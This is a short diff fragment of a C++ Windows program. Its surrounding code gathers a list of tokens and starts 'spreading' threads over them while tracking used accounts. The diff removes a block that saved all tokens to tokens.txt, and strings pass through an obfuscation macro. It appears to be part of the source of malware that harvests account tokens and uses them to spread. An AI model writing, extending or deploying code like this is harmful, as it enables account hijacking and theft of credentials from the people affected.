@@ -182,12 +182,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 		t.join();
 	}
 
-	// save all tokens to tokens.txt
-	std::ofstream tokensFile(X("tokens.txt"));
-	for (const auto &token : tokens) {
-		tokensFile << token << std::endl;
-	}
-
 	vector<string> usedAccounts;
 	vector<thread> speadingThreads;
 	for (auto &token : tokens) {
